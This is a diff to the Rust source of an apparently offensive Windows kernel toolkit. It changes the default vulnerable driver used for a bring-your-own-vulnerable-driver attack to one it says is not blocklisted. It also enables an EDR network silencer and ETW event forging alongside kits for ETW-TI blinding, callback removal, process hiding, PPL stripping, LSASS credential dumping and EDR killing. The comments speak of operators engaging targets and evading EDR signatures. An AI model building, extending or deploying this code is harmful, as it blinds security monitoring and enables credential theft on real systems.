@@ -13,9 +13,9 @@
 //!
 //! ## Full bootstrap chain
 //! ```text
-//!   operator: bootstrap_byovd("RTCore64.sys", "RTCore64")
+//!   operator: bootstrap_byovd("shield.sys", "shield")
 //!     → driver_load::LoadedDriver::load   (registry + NtLoadDriver)
-//!     → byovd::ByovdDriver::open          (CreateFileW on \\.\RTCore64)
+//!     → byovd::ByovdDriver::open          (CreateFileW on \\.\EAZShield)
 //!     → kernel_base::ntoskrnl_base()      (NtQuerySystemInformation)
 //!     → resolve_kernel_symbol(ntoskrnl, "EtwThreatIntProvRegHandle")
 //!     → etwti::EtwTiBlind::blind(krw)     (the algorithm runs)
@@ -33,6 +33,12 @@ pub mod kernel_base;
 /// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
 /// file drop or driver load. No blocklist signature, no Sysmon EID 6.
 pub mod ksld;
+/// PeekabooProbe production seam — user-mode client for the signed probe
+/// driver (`tools/peekaboo-probe/`): handshake + status/track IOCTLs, loaded
+/// via `driver_load`. Supplies the live `PeekabooProbe` that makes the
+/// offset-free `PeekabooWindow` (tier 1 of `select_pg_window_with_probe`)
+/// reachable in production.
+pub mod peekaboo;
 pub mod pagewalk;
 pub mod pattern_scan;
 pub mod resolve;
@@ -43,7 +49,8 @@ pub mod wdt;
 /// operator-side replacement for the implant's user-mode T-REX kernel stubs.
 pub mod assess;
 
-use crate::byovd::{ByovdDriver, RtCore64, VulnDriverIoctl};
+use crate::byovd::{ByovdDriver, VulnDriverIoctl};
+use crate::byovd_drivers::Shield;
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
 use crate::{DriverHandle, EtwTiKit, KernelRw, KernelTier, KitError, PatchGuardKit};
 use alloc::boxed::Box;
@@ -128,13 +135,15 @@ pub unsafe fn bootstrap_chain(
 
 /// The full BYOVD bootstrap: load driver → open device → return KernelRw.
 ///
-/// Convenience wrapper around [`bootstrap_byovd_with`] that uses the reference
-/// [`RtCore64`] (MSI Afterburner, CVE-2019-16098) as the vulnerable driver.
-/// Use [`bootstrap_byovd_with`] to plug in an alternative `VulnDriverIoctl`
+/// Convenience wrapper around [`bootstrap_byovd_with`] that uses [`Shield`]
+/// (Horizon DataSys RollBack Rx, LOLDrivers #344) as the vulnerable driver —
+/// clean (NOT on the Microsoft Vulnerable Driver Blocklist as of 2026-08),
+/// arbitrary kernel-VA memcpy in a single bidirectional IOCTL. Use
+/// [`bootstrap_byovd_with`] to plug in an alternative `VulnDriverIoctl`
 /// implementation (a stealthier Nday, a vendor whitelisted driver, etc.).
 ///
-/// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\RTCore64.sys`).
-/// `svc_name` = the service name for the registry key (e.g. `RTCore64`).
+/// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\shield.sys`).
+/// `svc_name` = the service name for the registry key (e.g. `shield`).
 ///
 /// Returns the loaded driver (for cleanup) + the ByovdDriver KernelRw.
 ///
@@ -145,9 +154,9 @@ pub unsafe fn bootstrap_byovd(
     sys_path: &[u16],
     svc_name: &[u16],
 ) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
-    // The default reference impl. The driver is hardcoded here for ergonomics;
-    // operators needing a different driver call bootstrap_byovd_with directly.
-    unsafe { bootstrap_byovd_with(sys_path, svc_name, Box::new(RtCore64)) }
+    // The default driver. Hardcoded here for ergonomics; operators needing a
+    // different driver call bootstrap_byovd_with directly.
+    unsafe { bootstrap_byovd_with(sys_path, svc_name, Box::new(Shield)) }
 }
 
 /// BYOVD bootstrap with an explicit vulnerable-driver implementation.
@@ -162,7 +171,7 @@ pub unsafe fn bootstrap_byovd(
 ///
 /// # When to use this over [`bootstrap_byovd`]
 ///
-/// - Engaging a target where `RTCore64.sys` is IOC-flagged by the EDR.
+/// - Engaging a target where the default `shield.sys` is IOC-flagged by the EDR.
 /// - Using a stealthier Nday driver that the EDR doesn't signature on yet.
 /// - Using a vendor-whitelisted driver (signed, low-reputation cost) as the
 ///   kernel R/W primitive.
@@ -182,7 +191,7 @@ pub unsafe fn bootstrap_byovd_with(
         .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;
 
     // 2. Open the device via the supplied driver's IOCTL contract
-    //    (CreateFileW on driver.device_name(), e.g. \\.\RTCore64).
+    //    (CreateFileW on driver.device_name(), e.g. \\.\EAZShield).
     let krw = match unsafe { ByovdDriver::open(driver) } {
         Ok(k) => k,
         Err(e) => {
@@ -539,9 +548,11 @@ pub fn select_pg_window(
 /// 1. **`PeekabooWindow`** (offset-free, all builds) — PREFERRED. Consumes only
 ///    PDB-resolved EPROCESS offsets, so it is NOT blocked by the
 ///    kernelsdk-1-1 verified-offsets gate; but it needs a kernel callback seam
-///    (a live [`crate::persistence::PeekabooProbe`]: a signed driver running a
-///    `PsSetCreateProcessNotifyRoutineEx` callback). Chosen when `probe` is
-///    `Some` and the build's EPROCESS offsets resolve.
+///    (a live [`crate::persistence::PeekabooProbe`]). The production impl is
+///    [`peekaboo::PeekabooProbeClient`] — load it with
+///    [`peekaboo::load_probe`] (driver_load machinery + handshake) and pass it
+///    here. Chosen when `probe` is `Some` and the build's EPROCESS offsets
+///    resolve.
 /// 2. **`RuntimePgBypassWindow`** (Win11 24H2+, flag-suspension) — needs
 ///    VERIFIED PG-context offsets (gated OFF until a table row flips
 ///    `verified`).
@@ -575,15 +586,16 @@ pub fn select_pg_window_with_probe<'a>(
 /// and wires up every kit that has a real implementation + resolved offsets:
 ///
 /// - **ETW-TI blind** — `EtwTiBlind` (needs `etw_ti_handle_kva` + `EtwTiOffsets`)
+/// - **ETW forge** — `EtwDeceiver` (pure user-mode buffer forging; always
+///   assembled, honest capability = buffer construction only — `NtTraceEvent`
+///   injection is operator-wired)
 /// - **Callback neutralize** — `CallbackNeutralizer` (needs notify-array KVAs)
 /// - **MiniFilter detach** — `MiniFilterUnlinker` (needs non-zero `flt_globals_kva`)
 /// - **Process hide** — `ProcessHider` (needs `ps_active_process_head_kva` + EPROCESS offsets)
 /// - **PPL strip/immortal** — `PplStripper` (same as ProcessHider)
 /// - **LSASS dump** — `KernelLsassReader` (needs `ps_active_process_head_kva` + EPROCESS offsets)
-/// - **WFP silencer** — `UserModeEdrSilencer` — NOT wired: the WFP path
-///   (`block_outbound_for_pid`) always returns `Err` until PID→image-path
-///   resolution (FWPM_CONDITION_ALE_APP_ID) is implemented, so `tier.wfp` is
-///   always `None` and the tier honestly reports wfp=false.
+/// - **WFP silencer** — `UserModeEdrSilencer` (always assembled; install can
+///   legitimately Err at runtime — not admin, BFE stopped, PPL target)
 /// - **EDR neutralize** — `EdrNeutralizer` (Freeze/Choke user-mode FFI; Kill via separate call)
 ///
 /// PatchGuard windows are NOT in the tier (they borrow `&dyn KernelRw` for their
@@ -637,6 +649,16 @@ pub fn assemble_tier(
         None
     };
 
+    // ETW forge (event deception) — pure user-mode buffer construction, no
+    // offsets and no kernel primitive needed, so it assembles unconditionally.
+    // Honest capability: the kit FORGES buffers only; injecting them
+    // (NtTraceEvent with a live session handle) is the operator's step, and
+    // forged events defeat frequency/content checks, not HMAC-validated
+    // sessions (see etw_deception module docs).
+    let etw_forge: Option<Box<dyn crate::EtwForgeKit>> = Some(Box::new(
+        crate::etw_deception::EtwDeceiver::with_kernel_defaults(),
+    ));
+
     // Callback neutralize — needs the notify-array KVAs.
     let callbacks = if runtime.create_process_notify_array_kva != 0
         || runtime.create_thread_notify_array_kva != 0
@@ -682,13 +704,13 @@ pub fn assemble_tier(
         None
     };
 
-    // WFP silencer — NOT assembled. `UserModeEdrSilencer::block_outbound_for_pid`
-    // always returns `Err` by design (WFP cannot filter on PID; a zero-condition
-    // filter would nuke ALL outbound traffic). Until PID→image-path resolution
-    // (FWPM_CONDITION_ALE_APP_ID) is implemented, wiring it would make the tier
-    // report `wfp=true` while `silence_edr` always fails at runtime — a false
-    // capability signal. Leave `None` so the tier honestly reports wfp=false.
-    let wfp: Option<Box<dyn crate::WfpKit>> = None;
+    // WFP silencer — implemented (P0-9 fix): `block_outbound_for_pid` resolves
+    // pid → image path → FwpmGetAppIdFromFileName0 and installs a one-condition
+    // FWPM_CONDITION_ALE_APP_ID block filter; there is no zero-condition
+    // fallback. Assembling the kit is now honest (wfp=true): install can still
+    // legitimately Err at runtime (not admin, BFE stopped, PPL target, process
+    // exited). Windows-lab runtime verification still pending.
+    let wfp: Option<Box<dyn crate::WfpKit>> = Some(Box::new(crate::netsec::UserModeEdrSilencer));
 
     // EDR neutralize (Kill/Freeze/Choke). Freeze+Choke are user-mode FFI that
     // run regardless of offsets; Kill needs the kernel primitive (operator
@@ -706,6 +728,7 @@ pub fn assemble_tier(
     KernelTier {
         rw: krw,
         etw_ti,
+        etw_forge,
         callbacks,
         minifilter,
         wfp,
